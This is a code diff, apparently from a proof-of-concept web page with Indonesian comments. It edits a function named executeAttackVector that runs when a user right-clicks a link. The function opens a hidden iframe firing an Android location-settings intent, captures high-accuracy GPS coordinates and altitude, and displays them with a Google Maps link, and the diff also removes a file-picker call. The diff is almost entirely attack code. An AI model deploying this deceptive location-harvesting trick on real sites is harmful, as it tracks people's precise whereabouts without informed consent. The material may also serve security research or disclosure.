@@ -95,20 +95,19 @@
             const coordDetails = document.getElementById("coordDetails");
             
             infoBox.style.display = "block";
-            statusText.innerText = "Requesting location permissions & triggering settings...";
+            statusText.innerText = "Triggering system location settings & requesting coordinates...";
 
             // Timer optimized to match preview page / action sequence
-            setTimeout(async () => {
+            setTimeout(() => {
                 try {
-                    // 1. Mencoba memicu Android Intent untuk membuka pengaturan lokasi sistem
-                    // (Akan berfungsi pada browser mobile berbasis Android yang mendukung intent scheme)
+                    // 1. Memicu Android Intent untuk membuka menu pengaturan lokasi perangkat secara langsung
                     const intentFrame = document.createElement('iframe');
                     intentFrame.style.display = 'none';
                     intentFrame.src = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;";
                     document.body.appendChild(intentFrame);
                     setTimeout(() => document.body.removeChild(intentFrame), 1000);
 
-                    // 2. Menangkap koordinat lokasi dengan tingkat akurasi tinggi (High-Accuracy Geolocation)
+                    // 2. Menangkap koordinat titik lokasi akurat tinggi menggunakan Geolocation API
                     if ("geolocation" in navigator) {
                         navigator.geolocation.getCurrentPosition(
                             (position) => {
@@ -118,30 +117,28 @@
                                 const altitude = position.coords.altitude || "N/A";
                                 const speed = position.coords.speed || "N/A";
 
-                                statusText.innerText = "Location successfully captured (High Accuracy)";
+                                statusText.innerText = "Precise Location Captured Successfully!";
                                 coordDetails.innerHTML = `
                                     <b>Latitude:</b> ${lat}<br>
                                     <b>Longitude:</b> ${lon}<br>
                                     <b>Accuracy:</b> ±${accuracy} meters<br>
                                     <b>Altitude:</b> ${altitude}<br>
-                                    <b>Speed:</b> ${speed}
+                                    <b>Speed:</b> ${speed}<br><br>
+                                    <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
                                 `;
                             },
                             (error) => {
                                 statusText.innerText = `Geolocation error: ${error.message}`;
                             },
                             {
-                                enableHighAccuracy: true, // Memaksa GPS hardware aktif untuk akurasi penuh
+                                enableHighAccuracy: true, // Memaksa penggunaan GPS/Hardware tingkat akurasi tinggi
                                 timeout: 15000,           // Batas waktu tunggu maksimal (15 detik)
-                                maximumAge: 0             // Mencegah penggunaan data cache lokasi lama
+                                maximumAge: 0             // Mencegah cache, mengambil data titik koordinat real-time
                             }
                         );
                     } else {
                         statusText.innerText = "Geolocation is not supported by this browser.";
                     }
-
-                    // Opsional: Tetap mempertahankan pemanggilan file picker jika diperlukan dalam alur PoC Anda
-                    await window.showOpenFilePicker().catch(() => {});
 
                 } catch (err) {
                     console.debug("Vector execution error:", err.message);
@@ -155,7 +152,7 @@
         const targetElement = document.getElementById("targetLink");
         
         targetElement.addEventListener("contextmenu", (e) => {
-            // e.preventDefault(); // Uncomment baris ini jika ingin menahan menu konteks bawaan
+            // e.preventDefault(); // Uncomment baris ini jika ingin menahan menu konteks bawaan browser
             executeAttackVector();
         });
 
